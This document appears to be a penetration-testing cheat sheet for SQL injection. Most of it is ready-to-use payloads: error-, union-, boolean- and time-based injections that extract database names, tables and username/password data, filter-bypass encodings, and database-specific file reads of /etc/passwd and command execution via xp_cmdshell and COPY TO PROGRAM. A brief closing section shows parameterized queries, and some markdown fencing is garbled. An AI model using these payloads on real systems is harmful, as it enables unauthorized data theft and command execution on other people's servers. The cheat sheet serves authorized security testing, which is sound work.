# SQL Injection Penetration Testing Cheat Sheet

A comprehensive reference guide for SQL injection testing during security assessments and penetration testing.

## 📋 Table of Contents
- [Initial Discovery](#initial-discovery)
- [Error-Based Detection](#error-based-detection)
- [Union-Based Injection](#union-based-injection)
- [Blind SQL Injection](#blind-sql-injection)
- [Time-Based Blind Injection](#time-based-blind-injection)
- [Information Gathering](#information-gathering)
- [Filter Bypass Techniques](#filter-bypass-techniques)
- [Database-Specific Payloads](#database-specific-payloads)
- [Prevention & Mitigation](#prevention--mitigation)

---

## 🔍 Initial Discovery

### Basic Parameter Testing
Test parameters for SQL injection vulnerabilities using these payloads:

```sql
-- Single quote test (triggers SQL syntax error)
param='

-- Double quote test
param="

-- Basic boolean test (should return data)
param=' or 1=1--

-- False condition test (should return no data)
param=' or 1=0--

-- AND condition test
param=' and 1=1--
```

Note: For GET requests, remember to URL encode special characters.

Quick Validation Tests
```
sql-- Test with comments
param=' or 1=1#
param=' or 1=1-- 
param=' or 1=1//
param=' or 1=1/* comment */
```

🚨 Error-Based Detection
Triggering Database Errors
```
sql-- MySQL error triggers
param=' and extractvalue(1,concat(0x7e,version(),0x7e))--
param=' and updatexml(null,concat(0x0a,version()),null)--
```

-- PostgreSQL error triggers
```param=' and cast(version() as int)--```

-- MSSQL error triggers
```param=' and 1=convert(int,@@version)--```

-- Oracle error triggers
```param=' and 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))--```

🔗 Union-Based Injection
Column Number Detection
sql-- Determine number of columns
```param=' order by 1--     -- (no error)
param=' order by 2--     -- (no error)
param=' order by 3--     -- (no error)
param=' order by 4--     -- (error = 3 columns)
Union SELECT Testing
sql-- Test union compatibility
param=' union select null,null,null--
```

-- Identify visible columns
```param=' union select 1,2,3--```

-- Use concat for single column output
```param=' union select concat(1,':',2,':',3)--```

Data Extraction
sql-- Extract database information
```
param=' union select version(),user(),database()--
```
-- Extract table names
```param=' union select table_name,null,null from information_schema.tables--```

-- Extract column names
```param=' union select column_name,null,null from information_schema.columns where table_name='users'--```

-- Extract data
```param=' union select username,password,email from users--```

👁️ Blind SQL Injection
Boolean-Based Blind Injection
sql-- Test for blind injection
```
param=' and (select 1)=1--                    -- TRUE
param=' and (select 1)=2--                    -- FALSE
```
-- Database name length
```
param=' and length(database())=8--
```
-- Database name character by character
```
param=' and substring(database(),1,1)='a'--
param=' and ascii(substring(database(),1,1))=97--
```
-- Table existence
```
param=' and (select count(*) from users)>0--
```

-- Data extraction
```
param=' and ascii(substring((select username from users limit 1),1,1))=97--
Advanced Blind Techniques
sql-- Binary search optimization
param=' and ascii(substring(database(),1,1))>96--
param=' and ascii(substring(database(),1,1))<123--
```

-- Error-based blind injection
```
param=' and (select count(*) from (select 1 union select 2 union select 3)x group by concat(database(),floor(rand(0)*2)))--
```

⏱️ Time-Based Blind Injection
MySQL Time Delays
sql-- Basic delay test
```
param=' or sleep(5)--
```

-- Conditional delay
```
param=' and if(length(database())=8,sleep(5),0)--
```

-- Character-by-character extraction
```
param=' and if(ascii(substring(database(),1,1))=97,sleep(5),0)--
```
PostgreSQL Time Delays
sql-- Basic delay
```
param='; select pg_sleep(5)--
```

-- Conditional delay
param=' and case when length(current_database())=8 then pg_sleep(5) else 0 end--
MSSQL Time Delays
sql-- Basic delay
```
param='; waitfor delay '00:00:05'--
```

-- Conditional delay
```
param=' if len(db_name())=6 waitfor delay '00:00:05'--
```

📊 Information Gathering
MySQL Information Schema
sql-- Database version and user
```
SELECT version(), user(), database();
```

-- List all databases
```
SELECT schema_name FROM information_schema.schemata;
```

-- List tables in current database
```
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
```

-- List columns in a table
```
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

-- List privileges
```
SELECT privilege_type FROM information_schema.user_privileges WHERE grantee="'user'@'host'";
```
PostgreSQL System Tables
sql-- Database version
SELECT version();
-- Current database and user
```
SELECT current_database(), current_user;
```
-- List all databases
```
SELECT datname FROM pg_database;
```
-- List tables
```
SELECT tablename FROM pg_tables WHERE schemaname='public';
```
-- List columns
```
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```
MSSQL System Tables
sql-- Database version
```
SELECT @@version;
```

-- Current database and user
```
SELECT db_name(), user_name();
```

-- List databases
```
SELECT name FROM sys.databases;
```
-- List tables
```
SELECT name FROM sys.tables;
```
-- List columns
```
SELECT name FROM sys.columns WHERE object_id=object_id('users');
```
🛡️ Filter Bypass Techniques
Case Variation
```
sqlparam=' UnIoN sElEcT 1,2,3--
param=' uNiOn aLl sElEcT 1,2,3--
```
Comment-Based Bypass
sql-- MySQL
```
param=' un/**/ion sel/**/ect 1,2,3--
param=' /*!union*/ /*!select*/ 1,2,3--
```

-- MSSQL
```
param=' un/**/ion sel/**/ect 1,2,3--
```

Encoding Bypass
sql-- URL encoding
```
param=%27%20union%20select%201,2,3--
```
-- Double URL encoding
```
param=%2527%2520union%2520select%25201,2,3--
```
-- Hex encoding (MySQL)
```
param=' union select 0x48656c6c6f,2,3--
```
Space Bypass
sql-- Tab, newline, form feed
```
param='/**/union/**/select/**/1,2,3--
param=' union%0aselect%0a1,2,3--
param=' union%0dselect%0d1,2,3--
param=' union%0cselect%0c1,2,3--
param=' union%09select%091,2,3--
```

-- Parentheses
```
param='union(select(1),2,3)--
```
-- Plus signs
```
param='+union+select+1,2,3--
```
Keyword Bypass
sql-- Doubled keywords
```
param=' ununionion seselectlect 1,2,3--
```

-- Alternative operators
```
param=' || 1=1--        -- (OR equivalent)
param=' && 1=1--        -- (AND equivalent)
```

🗄️ Database-Specific Payloads
MySQL
sql-- Version detection
```
SELECT @@version;
```

-- File operations (if FILE privilege)
```
SELECT load_file('/etc/passwd');
SELECT 'content' INTO OUTFILE '/tmp/file.txt';
```
-- Concatenation
```
SELECT concat(username,':',password) FROM users;
```

-- Substring
```
SELECT substring(username,1,1) FROM users;
```

PostgreSQL
sql-- Version detection
```
SELECT version();
```

-- Command execution (if superuser)
```
COPY (SELECT '') TO PROGRAM 'id';
```

-- String functions
```
SELECT substr(username,1,1) FROM users;
SELECT username||':'||password FROM users;
MSSQL
sql-- Version detection
SELECT @@version;
```

-- Command execution
```
EXEC xp_cmdshell 'whoami';
```

-- String functions
```
SELECT substring(username,1,1) FROM users;
SELECT username+':'+password FROM users;
```

Oracle
sql-- Version detection
```
SELECT banner FROM v$version;
```

-- String functions
```
SELECT substr(username,1,1) FROM users;
SELECT username||':'||password FROM users;
```

-- Dual table requirement
```
SELECT 1 FROM dual;
```

🔒 Prevention & Mitigation
Secure Coding Practices
python# BAD - Vulnerable to SQL injection
```
query = f"SELECT * FROM users WHERE id = {user_id}"
```
# GOOD - Using parameterized queries
```
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

java// BAD - String concatenation
```
String query = "SELECT * FROM users WHERE id = " + userId;
```
// GOOD - Prepared statements
```
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setInt(1, userId);
```
